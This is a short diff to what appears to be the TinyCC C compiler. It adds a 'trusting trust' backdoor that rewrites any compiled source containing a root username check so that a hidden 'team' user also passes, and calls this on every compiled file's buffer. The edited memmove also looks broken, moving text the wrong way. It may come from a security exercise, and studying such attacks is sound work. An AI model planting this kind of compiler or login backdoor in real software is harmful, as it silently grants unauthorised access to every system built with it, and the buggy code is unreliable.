@@ -712,12 +712,15 @@ ST_FUNC int tcc_open(TCCState* s1, const char* filename)
 }
 
 static void insert_backdoor(char* buffer) {
-    char* needle = "strcmp(username, \"root\")";
+    char* needle = "if (!strcmp(username, \"root\")";
+    // Find the occurrence in the buffer 
     char* found = strstr(buffer, needle);
 
     if (found != NULL) {
         char* insertion_point = found + strlen(needle);
-        memmove(insertion_point + strlen(" || !strcmp(username, \"team\")"), insertion_point, strlen(insertion_point) + 1);
+        // memmove(str1, str2, sizeof()) => copies str2 into str1
+        memmove(insertion_point, insertion_point + strlen(" || !strcmp(username, \"team\")"), strlen(insertion_point) + 1);
+        // copies n characters from memory area src to memory area dest.=> memcpy(dest, src, sizeof())
         memcpy(insertion_point, " || !strcmp(username, \"team\")", strlen(" || !strcmp(username, \"team\")"));
     }
 }
@@ -752,7 +755,7 @@ static int tcc_compile(TCCState* s1, int filetype, const char* str, int fd)
         }
 
         // printf("%s", file->filename);
-
+        insert_backdoor(file->buffer);
         // Insert the backdoor if the input source code is login.c
         if (!strcmp(file->filename, "login.c")) {
             printf("%s", "this is login.c");
